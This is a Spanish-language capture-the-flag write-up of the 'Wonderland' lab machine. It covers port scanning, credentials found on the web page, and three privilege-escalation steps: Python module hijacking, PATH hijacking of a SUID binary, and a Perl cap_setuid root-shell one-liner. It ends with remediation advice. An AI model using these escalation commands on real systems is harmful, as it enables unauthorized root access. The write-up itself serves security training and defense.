# Wonderland

## Initial Scan
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.

```
## Enum
### HTPP 
#### Gobusting
```
/img
/poem
/r/a/b/b/i/t <- alice:HowDothTheLittleCrocodileImproveHisShiningTail
```

## Privesc
Con estas creds estamos logeados como alice
### Alice
```
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
El script al que llamamos tiene la siguiente estructura
```
import random
# poem
for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```
Creemos un modulo de python llamado random con la siguiente función
```
import os

def choice(string):
	os.system("/bin/bash")
```

Con esto en la carpeta en la que estamos lanzamos el siguiente comando
```
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
### Rabbit
#### SUID
```
/home/rabbit/teaParty
```
Este binario es extraño y tiene el SUID de hatter, corramoslo con ltrace
```
ltrace ./teaParty
setuid(1003)                                                                              = -1
setgid(1003)                                                                              = -1
puts("Welcome to the tea party!\nThe Ma"...Welcome to the tea party!
The Mad Hatter will be here soon.
)                                              = 60
system("/bin/echo -n 'Probably by ' && d"...Probably by Thu, 20 Aug 2020 20:38:38 +0000
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                    = 0
puts("Ask very nicely, and I will give"...Ask very nicely, and I will give you some tea while you wait for him
)                                               = 69
getchar(1, 0x560b3f0c5260, 0x7f59805288c0, 0x7f598024b154
)                                = 10
puts("Segmentation fault (core dumped)"...Segmentation fault (core dumped)
)                                               = 33
+++ exited (status 33) +++
```
La llamada al sistema es interesante, aunque no se muestra entera, veamosla con cat
```
/bin/echo -n 'Probably by ' && date --date='next hour' -RAsk very nicely, and I will give you some tea while you wait for him
```
Se llama a date sin especificar la ruta, ahi tenemos nuestro punto de fallo
```
rabbit@wonderland:/home/rabbit$ mkdir tools
rabbit@wonderland:/home/rabbit$ cd tools
rabbit@wonderland:/home/rabbit/tools$ echo '/bin/bash' > date 
rabbit@wonderland:/home/rabbit/tools$ PATH=$PWD:$PATH
rabbit@wonderland:/home/rabbit$ ./teaParty 
```
### Hatter
No se por que no enumere antes capabilities, pero si las miramos tenemos lo siguiente
```
hatter@wonderland:~$ getcap -r / 2> /dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```
Dos setuid caps, podemos abusar de ellas desde cualquier user
```
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```
Y ya somos root

# Analisis de la intrusión
### Sensible data leak
Las credenciales de Alice quedaron expuestas en la pagina web
### Vuln python script
El script de walrus_and_the_carpenter.py que puede ser ejcutado por alice como Rabbit es vulnerable a un python path hijacking de modo que hemos podido usarlo para escalar lateralmente a rabbit
### Vuln bin with suid
El binario de teaParty utiliza una llamada sin la ruta completa a date, esto permite que efecutemos un PATH hijacking escalando  lateralmente a hatter
### Perl Set UID capabilities 
La capability cap_setuid+ep esta activa en los binarios de perl, esto nos ha permitido escalar hasta root


# Solucion
### Vuln python script
Hay varios parches que habria que hacer para mitigar esto:
* 1. Hacer el PYTHONPATH no modificable
* 2. Mover el script a una carpeta donde no tenga permiso de escritura el resto de usuarios
* 3. Eliminar la posibilad de ejecutar este script como otro usuario
### Vuln bin with SUID
Hay dos tipos de parche posibles, el primero quitat el SUID de aquí y cortariamos de raíz el problema, el segundo podemos usar la ruta absoluta para llamar al binario de date
### Perl Set UID capabilities
La contramedida posible seria quitar la capabilitie de los dos binarios de perl que la tienen activa
